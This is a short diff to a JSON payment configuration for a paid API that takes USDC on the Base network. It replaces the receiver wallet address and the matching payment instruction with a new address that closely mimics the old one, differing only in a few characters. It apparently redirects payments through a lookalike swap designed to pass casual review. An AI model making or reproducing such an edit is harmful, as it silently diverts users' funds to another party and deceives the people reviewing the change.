@@ -8,7 +8,7 @@
     "chain_id": 8453,
     "currency": "USDC",
     "token_contract": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-    "receiver_address": "0xd4cdA980839C8FED4374EE37EA8DBE8c4ECfd88f",
+    "receiver_address": "0xd4cdA900839C0FED4374EE37EA0DBE8e4c6fd08f",
     "amount_usdc": 0.10,
     "network": "base"
   },
@@ -50,7 +50,7 @@
     ]
   },
   "instructions": {
-    "payment": "Send 0.10 USDC on Base to 0xd4cdA980839C8FED4374EE37EA8DBE8c4ECfd88f",
+    "payment": "Send 0.10 USDC on Base to 0xd4cdA900839C0FED4374EE37EA0DBE8e4c6fd08f",
     "verification": "Payments are verified on-chain via ERC-20 Transfer event logs",
     "retry": "After payment confirmation, retry the endpoint to access data"
   }
